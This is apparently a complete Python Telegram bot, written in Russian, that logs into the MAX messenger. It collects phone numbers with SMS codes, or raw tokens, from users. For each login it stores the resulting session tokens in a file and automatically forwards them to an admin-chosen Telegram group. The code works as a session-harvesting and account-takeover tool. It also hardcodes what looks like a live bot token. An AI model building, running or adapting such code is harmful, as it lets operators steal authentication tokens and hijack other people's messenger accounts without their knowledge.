import os
import re
import asyncio
import threading
import logging
from datetime import datetime
from telebot import TeleBot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from pymax import MaxClient
from pymax.payloads import UserAgentPayload

# ============ НАСТРОЙКИ ============
BOT_TOKEN = "8659417974:AAE359LdyMebHRJToSUJi7QnkcXHD-A9xBI"
ADMIN_ID = 626387429
GROUP_FILE = "group_id.txt"
# ===================================

bot = TeleBot(BOT_TOKEN, threaded=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

user_states = {}
saved_sessions = []

def load_group_id():
    if os.path.exists(GROUP_FILE):
        with open(GROUP_FILE, "r") as f:
            try:
                return int(f.read().strip())
            except:
                return None
    return None

def save_group_id(group_id):
    with open(GROUP_FILE, "w") as f:
        f.write(str(group_id))

GROUP_CHAT_ID = load_group_id()

def main_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("📱 Войти по номеру"),
        KeyboardButton("🔑 Войти по токену"),
        KeyboardButton("📷 Сканировать QR"),
        KeyboardButton("📋 Мои сессии"),
        KeyboardButton("📤 Отправить в группу")
    )
    return markup

def cancel_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("❌ Отмена"))
    return markup

async def max_request_code(phone):
    ua = UserAgentPayload(
        device_type="DESKTOP",
        app_version="26.2.3",
        system_version="macOS Sonoma 14.5",
        screen="1440x900 2.0x",
        timezone="Europe/Moscow",
        locale="ru-RU"
    )
    client = MaxClient(phone=phone, work_dir="cache", headers=ua)
    try:
        await client.start()
        return True, client, "Код отправлен на номер"
    except Exception as e:
        await client.stop()
        return False, None, f"Ошибка: {e}"

async def max_confirm_code(client, code):
    try:
        await client.login(code=code)
        me = client.me
        token = client.token
        phone = client.phone
        info = (
            f"ID: {me.id}\n"
            f"Имя: {me.firstname} {me.lastname or ''}\n"
            f"Телефон: {phone}\n"
            f"Токен: {token[:50]}..."
        )
        await client.stop()
        return True, token, phone, info
    except Exception as e:
        await client.stop()
        return False, None, None, f"Ошибка: {e}"

async def max_login_by_token(token):
    ua = UserAgentPayload(
        device_type="DESKTOP",
        app_version="26.2.3",
        system_version="macOS Sonoma 14.5",
        screen="1440x900 2.0x",
        timezone="Europe/Moscow",
        locale="ru-RU"
    )
    client = MaxClient(token=token, work_dir="cache", headers=ua)
    try:
        await client.start()
        me = client.me
        info = f"ID: {me.id}\nИмя: {me.firstname} {me.lastname or ''}\nТелефон: {client.phone}"
        await client.stop()
        return True, info
    except Exception as e:
        await client.stop()
        return False, f"Ошибка: {e}"

def send_sessions_to_group():
    global GROUP_CHAT_ID
    if not GROUP_CHAT_ID:
        return "❌ Группа не настроена. Используйте /group в группе (только админ)."
    if not saved_sessions:
        return "Нет сохранённых сессий."
    msg = "🔑 **Сессии MAX:**\n\n"
    for i, s in enumerate(saved_sessions[-10:], 1):
        msg += f"{i}. `{s[:40]}...`\n"
    try:
        bot.send_message(GROUP_CHAT_ID, msg, parse_mode="Markdown")
        return f"Отправлено {min(len(saved_sessions), 10)} сессий в группу."
    except Exception as e:
        return f"Ошибка отправки в группу: {e}"

# ============ КОМАНДА /group (АДМИН) ============
@bot.message_handler(commands=['group'])
def set_group(message):
    global GROUP_CHAT_ID
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ Доступ запрещён.")
        return

    # Если команда в группе (или супергруппе) — берём ID этого чата
    if message.chat.type in ['group', 'supergroup']:
        new_group_id = message.chat.id
        save_group_id(new_group_id)
        GROUP_CHAT_ID = new_group_id
        bot.reply_to(message, f"✅ Эта группа сохранена для отправки сессий.\nID: `{new_group_id}`", parse_mode="Markdown")
        return

    # Если в личке — пробуем аргумент
    parts = message.text.strip().split()
    if len(parts) != 2:
        bot.reply_to(message, "ℹ️ В личке укажите ID: `/group -1001234567890`\nВ группе просто `/group`", parse_mode="Markdown")
        return

    try:
        new_group_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ ID группы должен быть числом.")
        return

    save_group_id(new_group_id)
    GROUP_CHAT_ID = new_group_id
    bot.reply_to(message, f"✅ ID группы сохранён: `{new_group_id}`", parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def start(message):
    user_states.pop(message.chat.id, None)
    bot.reply_to(message,
        "🤖 **MAX Session Bot**\n\nВыберите действие:",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    global GROUP_CHAT_ID
    chat_id = message.chat.id
    text = message.text.strip() if message.text else ""
    state = user_states.get(chat_id, {}).get("state")

    if text == "❌ Отмена":
        user_states.pop(chat_id, None)
        bot.reply_to(message, "Отменено.", reply_markup=main_keyboard())
        return

    if text == "📱 Войти по номеру":
        user_states[chat_id] = {"state": "waiting_phone"}
        bot.reply_to(message, "📱 Введите номер:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return

    if state == "waiting_phone":
        phone = re.sub(r'[\s\-\(\)]', '', text)
        if not phone.startswith("+"):
            phone = "+7" + phone.lstrip("87")
        if len(phone) < 11:
            bot.reply_to(message, "❌ Номер короткий.", reply_markup=cancel_keyboard())
            return
        bot.reply_to(message, "📱 Запрашиваю SMS-код...")
        def req():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            ok, client, msg = loop.run_until_complete(max_request_code(phone))
            if ok:
                user_states[chat_id] = {"state": "waiting_code", "phone": phone, "client": client}
                bot.send_message(chat_id, f"✅ {msg}\n\n📩 Введите 6-значный код:", reply_markup=cancel_keyboard())
            else:
                bot.send_message(chat_id, f"❌ {msg}", reply_markup=main_keyboard())
                user_states.pop(chat_id, None)
            loop.close()
        threading.Thread(target=req).start()
        return

    if state == "waiting_code":
        code = re.sub(r'\D', '', text)
        if len(code) != 6:
            bot.reply_to(message, "❌ 6 цифр.", reply_markup=cancel_keyboard())
            return
        client = user_states[chat_id]["client"]
        phone = user_states[chat_id]["phone"]
        bot.reply_to(message, "🔐 Подтверждаю код...")
        def conf():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            ok, token, ph, info = loop.run_until_complete(max_confirm_code(client, code))
            if ok:
                saved_sessions.append(token)
                with open("sessions.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()} | {ph} | {token}\n")
                bot.send_message(chat_id, f"🟢 **ВХОД ВЫПОЛНЕН!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
                if GROUP_CHAT_ID:
                    try:
                        bot.send_message(GROUP_CHAT_ID, f"🔑 Новая сессия:\n`{token[:50]}...`", parse_mode="Markdown")
                    except:
                        pass
            else:
                bot.send_message(chat_id, f"🔴 {info}", reply_markup=main_keyboard())
            user_states.pop(chat_id, None)
            loop.close()
        threading.Thread(target=conf).start()
        return

    if text == "🔑 Войти по токену":
        user_states[chat_id] = {"state": "waiting_token"}
        bot.reply_to(message, "🔑 Вставьте токен:", reply_markup=cancel_keyboard())
        return

    if state == "waiting_token":
        token = text.replace(" ", "").replace("\n", "")
        if len(token) < 50:
            bot.reply_to(message, "❌ Токен короткий.", reply_markup=cancel_keyboard())
            return
        bot.reply_to(message, "🔍 Проверяю...")
        def tok():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            ok, info = loop.run_until_complete(max_login_by_token(token))
            if ok:
                saved_sessions.append(token)
                with open("sessions.txt", "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now()} | TOKEN | {token}\n")
                bot.send_message(chat_id, f"🟢 **СЕССИЯ АКТИВНА!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
                if GROUP_CHAT_ID:
                    try:
                        bot.send_message(GROUP_CHAT_ID, f"🔑 Новая сессия:\n`{token[:50]}...`", parse_mode="Markdown")
                    except:
                        pass
            else:
                bot.send_message(chat_id, f"🔴 {info}", reply_markup=main_keyboard())
            user_states.pop(chat_id, None)
            loop.close()
        threading.Thread(target=tok).start()
        return

    if text == "📷 Сканировать QR":
        user_states[chat_id] = {"state": "waiting_qr"}
        bot.reply_to(message, "📷 Отправьте фото с QR-кодом:", reply_markup=cancel_keyboard())
        return

    if state == "waiting_qr":
        if not message.photo:
            bot.reply_to(message, "❌ Отправьте фото.", reply_markup=cancel_keyboard())
            return
        file_info = bot.get_file(message.photo[-1].file_id)
        file_content = bot.download_file(file_info.file_path)
        from io import BytesIO
        import requests as req
        try:
            resp = req.post("https://api.qrserver.com/v1/read-qr-code/", files={"file": BytesIO(file_content)})
            data = resp.json()
            if data and data[0]["symbol"][0]["data"]:
                qr_data = data[0]["symbol"][0]["data"]
                bot.reply_to(message, f"✅ QR распознан:\n\n`{qr_data}`", parse_mode="Markdown", reply_markup=main_keyboard())
            else:
                bot.reply_to(message, "❌ QR не найден.", reply_markup=main_keyboard())
        except:
            bot.reply_to(message, "❌ Ошибка распознавания.", reply_markup=main_keyboard())
        user_states.pop(chat_id, None)
        return

    if text == "📋 Мои сессии":
        if not saved_sessions:
            bot.reply_to(message, "Нет сохранённых сессий.", reply_markup=main_keyboard())
        else:
            msg = "📋 **Сохранённые сессии:**\n\n"
            for i, s in enumerate(saved_sessions[-10:], 1):
                msg += f"{i}. `{s[:40]}...`\n"
            bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard())
        return

    if text == "📤 Отправить в группу":
        result = send_sessions_to_group()
        bot.reply_to(message, result, reply_markup=main_keyboard())
        return

if __name__ == "__main__":
    os.makedirs("cache", exist_ok=True)
    print("🤖 MAX Session Bot запущен...")
    print(f"Админ ID: {ADMIN_ID}")
    print(f"Группа: {GROUP_CHAT_ID if GROUP_CHAT_ID else 'не задана'}")
    bot.infinity_polling()
